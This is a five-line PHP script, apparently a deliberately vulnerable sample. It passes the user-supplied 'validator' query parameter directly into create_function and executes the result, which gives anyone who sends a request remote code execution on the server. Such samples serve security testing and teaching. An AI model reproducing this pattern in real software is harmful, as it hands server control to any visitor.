<?php
$fn = $_GET['validator'] ?? "";
$callable = create_function('$x', $fn);
echo $callable("test");
?>